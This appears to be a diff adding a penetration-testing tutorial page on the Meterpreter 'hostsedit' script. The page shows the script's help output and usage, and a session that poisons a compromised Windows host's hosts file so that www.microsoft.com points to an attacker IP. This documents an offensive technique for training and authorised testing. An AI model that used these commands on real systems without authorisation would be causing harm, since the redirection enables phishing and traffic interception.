@@ -1,0 +1,29 @@
+The hostsedit Meterpreter script is for adding entries to the Windows hosts file. Since Windows will check the hosts file first instead of the configured DNS server, it will assist in diverting traffic to a fake entry or entries. Either a single entry can be provided or a series of entries can be provided with a file containing one entry per line.
+
+meterpreter > run hostsedit
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
+[!] Example: run post/windows/manage/inject_host OPTION=value [...]
+This Meterpreter script is for adding entries in to the Windows Hosts file.
+Since Windows will check first the Hosts file instead of the configured DNS Server
+it will assist in diverting traffic to the fake entry or entries. Either a single
+entry can be provided or a series of entries provided a file with one per line.
+
+OPTIONS:
+
+    -e   Host entry in the format of IP,Hostname.
+    -h        Help Options.
+    -l   Text file with list of entries in the format of IP,Hostname. One per line.
+
+Example:
+
+
+run hostsedit -e 127.0.0.1,google.com
+
+run hostsedit -l /tmp/fakednsentries.txt
+
+meterpreter > run hostsedit -e 10.211.55.162,www.microsoft.com
+[*] Making Backup of the hosts file.
+[*] Backup loacated in C:\WINDOWS\System32\drivers\etc\hosts62497.back
+[*] Adding Record for Host www.microsoft.com with IP 10.211.55.162
+[*] Clearing the DNS Cache
